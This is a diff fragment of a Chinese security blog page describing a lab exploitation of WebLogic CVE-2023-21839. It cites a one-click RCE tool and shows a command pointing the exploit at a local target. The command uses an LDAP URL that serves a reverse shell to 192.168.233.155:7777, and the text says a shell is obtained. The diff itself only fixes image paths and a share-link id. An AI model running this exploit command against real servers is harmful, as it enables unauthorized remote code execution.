 <h3 id="一、CVE-2023-21839"><a href="#一、CVE-2023-21839" class="headerlink" title="一、CVE-2023-21839"></a>一、CVE-2023-21839</h3><ul>
 <li>参考文章：<a target="_blank" rel="noopener" href="https://github.com/4ra1n/CVE-2023-21839">4ra1n&#x2F;CVE-2023-21839: Weblogic CVE-2023-21839 RCE (无需Java依赖一键RCE) (github.com)</a></li>
 </ul>
@@ -774,16 +774,16 @@ print(key_b.decode()) #字节型数据转换成中文数据
 <p>​	在靶机上运行参考文章1给出的工具。编译后执行</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./CVE-2023-21839 -ip 127.0.0.1 -port 7001 -ldap ldap://192.168.233.155:1389/Basic/ReverseShell/192.168.233.155/7777</span><br><span class="line"></span><br><span class="line">#</span><br></pre></td></tr></table></figure>
 
-<p><img src="/../images%5Cimage-20230306150414016.png" alt="image-20230306150414016"></p>
+<p><img src="/../images/image-20230306150414016.png" alt="image-20230306150414016"></p>
 <p>当出现返回值为200时，代表成功。</p>
-<p><img src="/../images%5Cimage-20230306150555688.png" alt="image-20230306150555688"></p>
+<p><img src="/../images/image-20230306150555688.png" alt="image-20230306150555688"></p>
 <p>当返回值成功后，我们便拿到了shell</p>
-<p><img src="/../images%5Cimage-20230306150716367.png" alt="image-20230306150716367"></p>
+<p><img src="/../images/image-20230306150716367.png" alt="image-20230306150716367"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/02/13/%E6%BC%8F%E6%B4%9E%E6%8E%A2%E8%AE%A8%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%B7%B1%E5%BA%A6%E6%80%9D%E8%80%83-XSS/" data-id="cuidT3jXmY5ZMZvNKGs_MIK3g" data-title="漏洞探讨学习及深度思考-XSS" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://example.com/2023/02/13/%E6%BC%8F%E6%B4%9E%E6%8E%A2%E8%AE%A8%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%B7%B1%E5%BA%A6%E6%80%9D%E8%80%83-XSS/" data-id="cuid9e2Ms6OhEF739V20aXCV2" data-title="漏洞探讨学习及深度思考-XSS" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
